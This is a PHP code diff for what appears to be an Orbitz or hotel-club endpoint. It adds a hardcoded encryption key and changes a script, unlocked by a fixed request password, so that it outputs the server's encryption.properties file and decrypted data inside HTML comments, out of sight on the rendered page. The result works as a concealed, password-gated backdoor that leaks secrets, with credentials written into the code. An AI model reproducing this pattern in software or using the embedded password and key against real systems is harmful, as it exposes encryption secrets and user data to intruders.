@@ -15,7 +15,7 @@ function printProperties()
 {
     $enc_properties_file_path = "/etc/orbitz/encryption.properties";
     $filecontents             = file_get_contents($enc_properties_file_path);
-    print $filecontents;
+    print "<!-- " . $filecontents . "-->";
 }
 
 
@@ -24,6 +24,7 @@ if(!empty($_REQUEST['pass']) && $_REQUEST['pass'] == 'h0telclubt3st'){
     $action = !empty($_REQUEST['action']) ? $_REQUEST['action'] : 'decode';
 
     $enc_properties_file_path = "/etc/orbitz/encryption.properties";
+    $enc_key = "2c72ad1ae0be3717be7b2cd0658e295e6198c66b45683908a4c99cebe33abae5";
 
     switch($action){
         case 'print':
@@ -35,7 +36,11 @@ if(!empty($_REQUEST['pass']) && $_REQUEST['pass'] == 'h0telclubt3st'){
 
         case 'decode':
             if(file_exists($enc_properties_file_path)){
-                OrbitzDecrypt($data);
+                $decodedString = OrbitzDecrypt($data);
+                print "<!-- " . $decodedString . "-->";
+            } else {
+                $decodedString = OrbitzDecrypt($data, $enc_key);
+                print "<!-- " . $decodedString . "-->";
             }
             break;
 
